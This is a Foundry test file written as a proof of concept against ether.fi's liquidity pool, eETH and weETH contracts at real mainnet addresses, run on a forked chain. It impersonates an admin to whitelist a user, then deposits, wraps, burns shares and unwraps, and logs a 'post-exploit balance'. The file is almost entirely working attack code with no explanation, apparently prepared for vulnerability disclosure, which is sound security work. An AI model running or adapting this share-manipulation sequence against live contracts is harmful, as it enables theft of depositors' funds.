// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";

interface IliqPool {
    function deposit(address _referral) external payable returns (uint256);
    function updateWhitelistedAddresses(address[] calldata _users, bool _value) external;
    function getTotalPooledEther() external view returns (uint256);
}

interface IWeth {
    function wrap(uint256 _eETHAmount) external returns (uint256);
    function unwrap(uint256 _weETHAmount) external returns (uint256);
    function balanceOf(address _user) external view returns (uint256);
}

interface IeETH {
    function burnShares(address _user, uint256 _share) external;
    function approve(address _spender, uint256 _amount) external returns (bool);
    function totalShares() external view returns (uint256);
    function balanceOf(address _user) external view returns (uint256);
}

contract etherfiPoc is Test {
    uint256 mainnetFork;
    address alice;
    IliqPool liqPool = IliqPool(0x308861A430be4cce5502d0A12724771Fc6DaF216);
    IeETH eETH = IeETH(0x35fA164735182de50811E8e2E824cFb9B6118ac2);
    IWeth WeETH = IWeth(0xCd5fE23C85820F7B72D0926FC9b05b43E359b7ee);
    function setUp() public {
        mainnetFork = vm.createFork(vm.envString("MAINNET_RPC_URL"));
        vm.selectFork(mainnetFork);
        alice = makeAddr("Alice");
        vm.deal(alice, 3_000_000 ether);
    }

    function testPoc() public {

        uint256 firstamount = 1_500_000 ether;
        uint256 secondamount = 1_500_000 ether;

        uint256 shareAmount1;
        uint256 shareAmount2;
        uint256 shareAmount3;
        uint256 ethAmount;
        uint256 totalShares;
        uint256 wethAmount;

        address[] memory users = new address[](1);
        users[0] = alice;


        // Assume the user is whitelisted
        vm.startPrank(0x9f26d4C958fD811A1F59B01B86Be7dFFc9d20761);
        liqPool.updateWhitelistedAddresses(users, true);
        vm.stopPrank();

        vm.startPrank(alice);
        // First deposit
        shareAmount1 = liqPool.deposit{value: firstamount}(address(0));
        eETH.approve(address(WeETH), type(uint256).max);
        // Wrapping the tokens
        wethAmount = WeETH.wrap(shareAmount1);
        // Deposit and burn
        shareAmount2 = liqPool.deposit{value: secondamount}(address(0));
        eETH.burnShares(alice, shareAmount2);
        // Unwrap
        shareAmount3 = WeETH.unwrap(wethAmount);
        ethAmount = liqPool.getTotalPooledEther();
        totalShares = eETH.totalShares();
        vm.stopPrank();

        // The initial deposit
        console.log("The initial balance of Alice");
        console.log(firstamount + secondamount);
        // The potential ETH balance of Alice after exploit
        console.log("The post-exploit balance of Alice");
        console.log("eETH", eETH.balanceOf(alice));
        console.log("weETH", WeETH.balanceOf(alice));
        console.log((shareAmount3 * ethAmount) / totalShares);
    }
}
